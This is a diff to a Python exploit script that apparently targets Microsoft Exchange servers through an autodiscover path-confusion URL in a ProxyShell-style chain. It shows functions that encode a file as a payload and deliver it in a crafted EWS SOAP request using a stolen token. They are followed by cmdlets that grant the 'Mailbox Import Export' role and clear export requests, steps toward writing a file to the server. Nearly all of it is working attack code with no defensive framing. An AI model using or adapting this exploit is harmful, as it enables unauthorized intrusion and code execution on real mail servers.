@@ -44,12 +44,13 @@ def pstb64Enc(localfile):
     with open(localfile) as filei:
         file_str = filei.read()
     payload_str = "".join(chr(replist[ord(c)]) for c in file_str)
+
     return xmodule.b64encode(payload_str.encode("latin-1")).decode()
 
 def deliverPayload(target, payload, usera, sid, token):
     ex_headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
-        "Cookie": "email=autodiscover/autodiscover.json/v1.0/@gmail.com",
+        "User-Agent": xmodule.user_agent,
+        "Cookie": "email=autodiscover/autodiscover.json/@gmail.com",
         "Content-Type": "text/xml",
     }
     ews_data = f"""<?xml version="1.0" encoding="utf-8"?>
@@ -102,7 +103,8 @@ def deliverPayload(target, payload, usera, sid, token):
             </soap:Body>
         </soap:Envelope>
     """
-    resx = xmodule.req.post(url=f"{target}/autodiscover/autodiscover.json/v1.0/@gmail.com/ews/exchange.asmx?X-Rps-CAT={token}", headers=ex_headers, data=ews_data, verify=False)
+    resx = xmodule.req.post(url=f"{target}/autodiscover/autodiscover.json/@gmail.com/ews/exchange.asmx?X-Rps-CAT={token}", headers=ex_headers, data=ews_data, verify=False)
+
     return True if resx.status_code == 200 else False
 
 def main(argv):
@@ -117,6 +119,7 @@ def main(argv):
     if isdeliver == False:
         print("[-] Try to deliver payload by email")
         exit(0)
+
     print("\033[92m[*] Write File:\033[0m")
     xmodule.execmdlet(server, token, pscript="New-ManagementRoleAssignment -Role \"Mailbox Import Export\" -User \"administrator\"")
     xmodule.execmdlet(server, token, pscript="Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest -Confirm:$false")
